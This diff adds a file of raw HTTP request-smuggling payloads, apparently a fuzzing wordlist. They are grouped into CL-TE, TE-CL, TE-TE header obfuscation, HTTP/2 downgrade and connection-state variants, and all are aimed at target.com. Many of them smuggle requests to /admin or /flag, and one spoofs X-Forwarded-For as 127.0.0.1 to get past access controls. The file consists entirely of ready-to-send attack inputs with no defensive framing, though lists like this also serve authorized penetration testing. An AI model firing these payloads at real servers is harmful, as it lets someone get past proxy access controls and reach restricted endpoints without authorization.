@@ -1,0 +1,27 @@
+# CL-TE Smuggling
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 41\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 60\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /admin HTTP/1.1\r\nContent-Length: 15\r\nX-Forwarded-For: 127.0.0.1
+
+# TE-CL Smuggling
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n2e\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\nX: X\r\n0\r\n
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n
+
+# TE-TE Obfuscation
+POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\nSMUGGLED
+POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: x\r\n\r\n0\r\n\r\nSMUGGLED
+POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: xchunked\r\n\r\n0\r\n\r\nSMUGGLED
+POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nSMUGGLED
+POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding:chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX
+POST / HTTP/1.1\r\nHost: target.com\r\nX: X[\n]Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED
+
+# H2-Downgrade Smuggling
+:method POST :path / :authority target.com content-length: 0 transfer-encoding: chunked\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com
+:method POST :path / :authority target.com transfer-encoding: chunked\r\n0\r\n\r\nPOST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 50\r\nx=
+:method GET :path / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED
+
+# Connection-state Smuggling
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 34\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /flag HTTP/1.1\r\nFoo: x
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n5\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nX-Ignore: X\r\n0\r\n
